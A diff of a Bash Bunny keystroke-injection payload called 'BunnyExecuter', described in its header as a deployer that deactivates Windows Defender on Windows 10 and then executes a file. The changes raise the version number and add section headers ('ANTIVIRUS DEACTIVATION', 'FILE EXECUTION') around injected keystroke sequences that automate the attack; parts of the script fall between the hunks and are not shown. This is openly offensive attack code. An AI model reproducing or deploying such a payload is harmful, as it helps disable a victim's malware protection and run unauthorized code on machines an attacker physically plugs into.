@@ -1,7 +1,7 @@
 # Title: BunnyExecuter
 # Description: Deployer which deactivates Windows Malware Defender
 # AUTHOR: DAZUM
-# Version: 1.3
+# Version: 1.5
 # Category: Execution
 # Target: Windows 10
 # Attackmodes: HID, Storage
@@ -18,6 +18,7 @@ GET SWITCH_POSITION
 LED ATTACK
 ##
 
+## ANTIVIRUS DEACTIVATION
 Q DELAY 1000
 Q CONTROL ESCAPE
 Q DELAY 200
@@ -50,6 +51,9 @@ Q DELAY 200
 Q SPACE
 Q DELAY 200
 Q ALT F4
+##
+
+## FILE EXECUTION
 Q DELAY 2000
 Q CONTROL ESCAPE
 Q DELAY 1000
@@ -66,5 +70,7 @@ Q DELAY 1000
 Q ENTER
 Q DELAY 1000
 Q GUI d
+##
+
 LED FINISH
 
